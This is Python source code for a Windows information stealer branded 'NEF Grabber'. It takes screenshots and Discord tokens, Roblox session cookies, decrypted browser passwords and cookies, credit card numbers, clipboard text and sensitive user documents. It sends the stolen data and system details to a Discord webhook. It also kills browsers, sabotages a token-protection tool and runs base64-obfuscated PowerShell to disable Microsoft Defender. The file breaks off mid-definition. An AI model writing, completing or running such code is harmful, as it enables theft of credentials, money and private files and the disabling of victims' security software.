webhook = "%$HOOK%$"
import concurrent.futures
import ctypes
import json
import os
import random
import requests
import subprocess
import sys
import zlib
from multiprocessing import cpu_count
from requests_toolbelt.multipart.encoder import MultipartEncoder
from zipfile import ZIP_DEFLATED, ZipFile
import psutil
import pycountry
import wmi
import cpuinfo
import socket
import platform
import uuid
import re
import base64
from win32crypt import CryptUnprotectData
import pyperclip
import browser_cookie3
from PIL import ImageGrab
import shutil
import winreg
import cv2
import base64
import sqlite3
import threading
import time
from Cryptodome.Cipher import AES
from typing import Union
from win32crypt import CryptUnprotectData

class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):  
        image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )
        image.save(temp_path + "\\desktopshot.png")
        image.close()

    def send_screenshot(self):
        webhook_data = {
            "username": "NEF",
            "avatar_url": "https://i.imgur.com/smPUgf7.png",
            "embeds": [
                {
                    "color": 996699,
                    "title": "Desktop Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }
        
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

        requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)

class Roblox:
    def __init__(self):
        self.roblox_cookies = {}
        self.grab_roblox_cookies()
        self.send_info()

    def grab_roblox_cookies(self):
        browsers = [
            ('Chrome', browser_cookie3.chrome),
            ('Edge', browser_cookie3.edge),
            ('Firefox', browser_cookie3.firefox),
            ('Safari', browser_cookie3.safari),
            ('Opera', browser_cookie3.opera),
            ('Brave', browser_cookie3.brave),
            ('Vivaldi', browser_cookie3.vivaldi)
        ]
        for browser_name, browser in browsers:
            try:
                browser_cookies = browser(domain_name='roblox.com')
                for cookie in browser_cookies:
                    if cookie.name == '.ROBLOSECURITY':
                        self.roblox_cookies[browser_name] = cookie.value
            except Exception:
                pass
            
    def send_info(self):
        for roblox_cookie in self.roblox_cookies.values():
            headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
            info = None
            try:
                response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
                response.raise_for_status()
                info = response.json()
            except Exception:
                pass

            first_cookie_half = roblox_cookie[:len(roblox_cookie)//2]
            second_cookie_half = roblox_cookie[len(roblox_cookie)//2:]

            if info is not None:
                data = {
                    "embeds": [
                        {
                            "title": "Roblox Info",
                            "color": 996699,
                            "fields": [
                                {
                                    "name": "Name:",
                                    "value": f"`{info['UserName']}`",
                                    "inline": True
                                },
                                {
                                    "name": "<:robux_coin:1041813572407283842> Robux:",
                                    "value": f"`{info['RobuxBalance']}`",
                                    "inline": True
                                },
                                {
                                    "name": ":cookie: Cookie:",
                                    "value": f"`{first_cookie_half}`",
                                    "inline": False
                                },
                                {    
                                    "name": "",
                                    "value": f"`{second_cookie_half}`",
                                    "inline": False
                                    
                                },
                            ],
                            "thumbnail": {
                                "url": info['ThumbnailUrl']
                            },
                            "footer": {
                                "text": "NEF Grabber | Crafted By Noface"
                            },
                        }
                    ],
                    "username": "NEF",
                    "avatar_url": "https://i.imgur.com/smPUgf7.png",
                }
                requests.post(webhook, json=data)

class Clipboard:
    def __init__(self):
        self.directory = os.path.join(temp_path, "Clipboard")
        os.makedirs(self.directory, exist_ok=True)
        self.get_clipboard()

    def get_clipboard(self):
        content = pyperclip.paste()
        if content:
            with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
                file.write(content)
        else:
            with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
                file.write("Clipboard is empty")

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.killprotector()
        self.grabTokens()
        self.upload(webhook)


    def killprotector(self):
        path = f"{self.roaming}\\DiscordTokenProtector"
        config = path + "config.json"
    
        if not os.path.exists(path):
            return
    
        for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
            try:
                os.remove(path + process)
            except FileNotFoundError:
                pass
    
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
    
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Vesktop': self.roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'
            }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            username = user['username']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"

            premium_types = {
                0: ":x:",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), ":x:")

            if "message" in payment or payment == []:
                methods = ":x:"
            else:
                methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else ":question:" for method in payment])

            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n:closed_lock_with_key: **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'

            data = {
                "embeds": [
                    {
                        "title": f"{username}",
                        "color": 996699,
                        "fields": [
                            {
                                "name": "Discord Info",
                                "value": val
                            }
                        ],
                        "thumbnail": {
                            "url": avatar_url
                        },
                        "footer": {
                            "text": "NEF Grabber | Crafted By Noface"
                        },
                    }
                ],
                "username": "NEF",
                "avatar_url": "https://i.imgur.com/smPUgf7.png",
            }

            requests.post(webhook, json=data)
            self.tokens_sent.append(token)

    def GetSelf(self) -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)

class PcInfo:
    def __init__(self, webhook_url):
        self.avatar = "https://i.imgur.com/smPUgf7.png"
        self.username = "NEF"
        self.host = socket.gethostname()
        self.username_pc = os.getlogin()
        self.os = platform.system()
        self.product_key = self.get_product_key()
        self.ip = self.get_ip()
        self.country = self.get_country()
        self.proxy = self.check_proxy()
        self.mac = self.get_mac()
        self.cpu = self.get_cpu_info()
        self.gpu = self.get_gpu_info()
        self.ram = self.get_ram_info()
        self.av = self.get_antivirus_info()

        self.webhook_url = webhook_url  # Store the webhook URL
        self.send_to_webhook()  # Send the data when the class is instantiated

    def get_ip(self):
        try:
            return requests.get("https://api.ipify.org").text
        except requests.RequestException:
            return "Unavailable"
    
    def get_mac(self):
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        return mac
    
    def get_cpu_info(self):
        if self.os == "Windows":
            c = wmi.WMI()
            for cpu in c.query("SELECT * FROM Win32_Processor"):
                return cpu.Name
        elif self.os == "Linux":
            info = cpuinfo.get_cpu_info()
            return info['cpu']
        else:
            return platform.processor()
    
    def get_gpu_info(self):
        if self.os == "Windows":
            c = wmi.WMI()
            for gpu in c.query("SELECT * FROM Win32_VideoController"):
                return gpu.Name
        elif self.os == "Linux":
            try:
                return subprocess.check_output("lspci | grep VGA", shell=True).decode().strip()
            except subprocess.CalledProcessError:
                return "Unavailable"
        else:
            return "Unknown GPU"
    
    def get_ram_info(self):
        ram_gb = psutil.virtual_memory().total / (1024 ** 3)
        return round(ram_gb, 2)
    
    def get_product_key(self):
        if self.os == "Windows":
            try:
                c = wmi.WMI()
                for os in c.query("SELECT * FROM Win32_OperatingSystem"):
                    return os.SerialNumber
            except Exception:
                return "Unavailable"
        return "N/A"
    
    def get_antivirus_info(self):
        if self.os == "Windows":
            try:
                c = wmi.WMI()
                for av in c.query("SELECT * FROM AntiVirusProduct"):
                    return av.displayName
            except Exception:
                return "No Antivirus Detected"
        return "No Antivirus Detected"
    
    def check_proxy(self):
        return "Proxy" if os.environ.get("http_proxy") or os.environ.get("https_proxy") else "No Proxy"
    
    def get_country(self):
        try:
            ip_info = requests.get(f"https://ipinfo.io/{self.ip}/json").json()
            return ip_info.get('country', 'Unknown')
        except requests.RequestException:
            return "Unknown"

    def get_country_code(self, country):
        country_flags = {
            "US": "us", "GB": "gb", "IN": "in", "CA": "ca"
        }
        return country_flags.get(country, "unknown")

    def format_system_info(self):
        data = {
            "embeds": [
                {
                    "title": "NEF Logger",
                    "color": 996699,
                    "fields": [
                        {
                            "name": "System Info",
                            "value": f''':computer: **PC Username:** `{self.username_pc}`
:desktop: **PC Name:** `{self.host}`
:globe_with_meridians: **OS:** `{self.os}`
<:windows:1239719032849174568> **Product Key:** `{self.product_key}`\n
:eyes: **IP:** `{self.ip}`
:flag_{self.get_country_code(self.country)}: **Country:** `{self.country}`
{":shield:" if self.proxy != "No Proxy" else ":x:"} **Proxy:** `{self.proxy}`
:green_apple: **MAC:** `{self.mac}`
:wrench: **UUID:** `{uuid.uuid4()}`\n
<:cpu:1051512676947349525> **CPU:** `{self.cpu}`
<:gpu:1051512654591688815> **GPU:** `{self.gpu}`
<:ram1:1051518404181368972> **RAM:** `{self.ram}GB`\n
:cop: **Antivirus:** `{self.av}`
'''
                        }
                    ],
                    "footer": {
                        "text": "NEF Grabber | Crafted By Noface"
                    },
                    "thumbnail": {
                        "url": self.avatar
                    }
                }
            ],
            "username": self.username,
            "avatar_url": self.avatar
        }
        return data
    
    def send_to_webhook(self):
        data = self.format_system_info()
        try:
            response = requests.post(self.webhook_url, json=data)
            print(f"Webhook status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error: {e}")

#global variables
temp = os.getenv("temp")
temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
os.mkdir(temp_path)
localappdata = os.getenv("localappdata")
if not hasattr(sys, "_MEIPASS"):
    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))


def main(webhook: str):
    threads = ["Startup", "Defender", "Browsers", "Wifi", "CommonFiles", "Clipboard", "capture_images", "steal_wallets", "Games"]


    if True:
        browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        browsers_found = []
        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in browser_exe:
                browsers_found.append(proc)

        for proc in browsers_found:
            try:
                proc.kill()
            except Exception:
                pass

    with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
        executor.map(lambda func: func(), threads)

    max_archive_size = 1024 * 1024 * 25
    current_archive_size = 0

    _zipfile = os.path.join(localappdata, f'NEF-Logged-{os.getlogin()}.zip')
    with ZipFile(_zipfile, "w", ZIP_DEFLATED) as zipped_file:
        for dirname, _, files in os.walk(temp_path):
            for filename in files:
                absname = os.path.join(dirname, filename)
                arcname = os.path.relpath(absname, temp_path)
                file_size = os.path.getsize(absname)
                if current_archive_size + file_size <= max_archive_size:
                    zipped_file.write(absname, arcname)
                    current_archive_size += file_size
                else:
                    break
                    
    content = "@here"
    data = {
        "content": content,
        "username": "NEF",
        "avatar_url": "https://i.imgur.com/smPUgf7.png"
    }
    requests.post(webhook, json=data)

    PcInfo(webhook)
    Discord()
    Roblox()
    Screenshot()

def NEF(webhook: str):
    def GetSelf() -> tuple[str, bool]:
        if hasattr(sys, "frozen"):
            return (sys.argv[0], True)
        else:
            return (__file__, False)    

    def ExcludeFromDefender(path) -> None:
        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)

    def CreateMutex(mutex: str) -> bool:
        kernel32 = ctypes.windll.kernel32
        mutex = kernel32.CreateMutexA(None, False, mutex)
        return kernel32.GetLastError() != 183

    def Injection(webhook: str):
        print(f"Injection with webhook: {webhook}")
    
    path, isExecutable = GetSelf()

    with concurrent.futures.ThreadPoolExecutor() as executor:
        executor.submit(Injection, webhook)
        main_instance = main(webhook)
        executor.submit(main_instance)
class AntiSpam:
    def __init__(self):
        if self.check_time():
            os._exit(0)

    def check_time(self) -> bool:
        current_time = time.time()
        file_path = os.path.join(temp, "dd_setup.txt")
        try:
            if os.path.exists(file_path):
                file_modified_time = os.path.getmtime(file_path)
                if current_time - file_modified_time > 60:
                    os.utime(file_path, (current_time, current_time))
                    return False
                else:
                    return True
            else:
                with open(file_path, "w") as f:
                    f.write(str(current_time))
                return False
        except Exception:
            return False

class CommonFiles:
    def __init__(self):
        self.zipfile = os.path.join(temp_path, f'Common-Files-{os.getlogin()}.zip')
        self.steal_common_files()
        

    def steal_common_files(self) -> None:
        def _get_user_folder_path(folder_name):
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as key:
                    value, _ = winreg.QueryValueEx(key, folder_name)
                    return value
            except FileNotFoundError:
                return None
            
        paths = [_get_user_folder_path("Desktop"), _get_user_folder_path("Personal"), _get_user_folder_path("{374DE290-123F-4565-9164-39C4925E467B}")]
        
        for search_path in paths:
            if os.path.isdir(search_path):
                entry: str
                for entry in os.listdir(search_path):
                    if os.path.isfile(os.path.join(search_path, entry)):
                        if (any([x in entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                            or entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx,", ".ods", ".json", ".ppk"))) \
                            and not entry.endswith(".lnk") \
                            and 0 < os.path.getsize(os.path.join(search_path, entry)) < 2 * 1024 * 1024: # File less than 2 MB
                            try:
                                os.makedirs(os.path.join(temp_path, "Common Files"), exist_ok=True)
                                shutil.copy(os.path.join(search_path, entry), os.path.join(temp_path, "Common Files", entry))
                            except Exception:
                                pass
                    elif os.path.isdir(os.path.join(search_path, entry)) and not entry == "Common Files":
                        for sub_entry in os.listdir(os.path.join(search_path, entry)):
                            if os.path.isfile(os.path.join(search_path, entry, sub_entry)):
                                if (any([x in sub_entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                                    or sub_entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx,", ".ods", ".json", ".ppk"))) \
                                    and not entry.endswith(".lnk") \
                                    and 0 < os.path.getsize(os.path.join(search_path, entry, sub_entry)) < 2 * 1024 * 1024: # File less than 2 MB
                                    try:
                                        os.makedirs(os.path.join(temp_path, "Common Files", entry), exist_ok=True)
                                        shutil.copy(os.path.join(search_path, entry, sub_entry), os.path.join(temp_path, "Common Files", entry))
                                    except Exception:
                                        pass

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.roblox_cookies()
        self.robloxinfo(webhook)

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        shutil.copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

def create_temp(_dir: Union[str, os.PathLike] = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path




class Debug:
    def __init__(self):
        if self.checks():
            os._exit(0)

    def checks(self):
        return (
            self.check_process() or
            self.get_network() or
            self.get_system() or
            self.checkHTTPSimulation() or
            self.checkVideoController()
        )

    def check_process(self) -> bool:
        pass

    def get_network(self) -> bool:
        pass

    def get_system(self) -> bool:
        pass
    
    def checkVideoController(self) -> bool:
        pass

    def checkHTTPSimulation(self) -> bool:
        try:
            requests.get(f'https://NEF-{"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))}.in')
        except Exception:
            return False
        else:
            return True



class Defender:
    def __init__(self):
        self.disable()
        self.exclude()

    def disable(self):
        cmd = base64.b64decode(b'cG93ZXJzaGVsbC5leGUgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlIC1FbmFibGVDb250cm9sbGVkRm9sZGVyQWNjZXNzIERpc2FibGVkIC1FbmFibGVOZXR3b3JrUHJvdGVjdGlvbiBBdWRpdE1vZGUgLUZvcmNlIC1NQVBTUmVwb3J0aW5nIERpc2FibGVkIC1TdWJtaXRTYW1wbGVzQ29uc2VudCBOZXZlclNlbmQgJiYgcG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1TdWJtaXRTYW1wbGVzQ29uc2VudCAy').decode(errors="ignore")
        subprocess.run(cmd, shell=True, capture_output=True)

    def exclude(self):
